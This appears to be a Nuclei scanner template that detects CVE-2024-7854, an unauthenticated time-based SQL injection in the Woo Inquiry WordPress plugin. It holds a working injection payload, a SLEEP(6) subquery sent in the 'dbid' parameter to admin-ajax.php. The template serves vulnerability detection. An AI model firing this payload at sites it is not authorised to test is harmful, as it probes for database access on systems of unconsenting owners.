flow: http(1) && http(2)
http:
- matchers:
  - dsl:
    - contains(body,"/wp-content/plugins/woo-inquiry")
    internal: true
    type: dsl
  raw:
  - 'GET / HTTP/1.1

    Host: {{Hostname}}

    '
- matchers:
  - condition: and
    dsl:
    - duration>=6
    - contains(content_type, "text/html")
    - status_code == 200
    type: dsl
  raw:
  - '@timeout: 20s

    POST /wp-admin/admin-ajax.php HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded; charset=UTF-8


    action=woo_wpinq_times_up&dbid=(SELECT(0)FROM(SELECT(SLEEP(6)))a)

    '
id: CVE-2024-7854
info:
  author: s4e-io
  classification:
    cpe: cpe:2.3:a:sjhoo:woo_inquiry:0.1:*:*:*:*:*:*:*
    cve-id: CVE-2024-7854
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-89
    epss-percentile: 0.39655
    epss-score: 0.00091
  description: 'The Woo Inquiry plugin for WordPress is vulnerable to SQL Injection
    in all versions up to, and including, 0.1 due to insufficient escaping on the
    user supplied parameter ''dbid'' and lack of sufficient preparation on the existing
    SQL query. This makes it possible for unauthenticated attackers to append additional
    SQL queries into already existing queries that can be used to extract sensitive
    information from the database.

    '
  metadata:
    framework: wordpress
    max-request: 2
    product: woo_inquiry
    publicwww-query: /wp-content/plugins/woo-inquiry
    vendor: sjhoo
    verified: true
  name: Woo Inquiry <= 0.1 - SQL Injection
  reference:
  - https://github.com/RandomRobbieBF/CVE-2024-7854
  - https://www.wordfence.com/threat-intel/vulnerabilities/id/312a6601-c914-4661-82ff-6f8bac849442?source=cve
  - https://nvd.nist.gov/vuln/detail/CVE-2024-7854
  severity: critical
  tags: time-based-sqli,cve,cve2024,wp,wordpress,wp-plugin,sqli,woo-inquiry
